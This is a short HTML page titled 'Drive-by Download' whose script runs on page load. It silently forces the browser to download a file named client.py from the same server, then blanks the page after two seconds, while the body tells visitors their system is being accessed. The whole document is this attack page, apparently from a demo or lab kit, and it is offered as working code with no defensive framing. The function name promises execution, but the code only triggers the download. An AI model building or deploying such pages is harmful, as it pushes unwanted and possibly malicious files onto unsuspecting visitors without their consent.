<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Drive-by Download</title>
    <script>
        function downloadAndExecuteScript() {
            var scriptUrl = window.location.origin + "/client.py";
            var link = document.createElement('a');
            link.href = scriptUrl;
            link.download = 'client.py';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        window.onload = function () {
            downloadAndExecuteScript();
            setTimeout(function () {
                window.location.href = 'about:blank';
            }, 2000);
        };
    </script>
</head>
<body>
    <h1>Please wait while your system is being accessed...</h1>
</body>
</html>
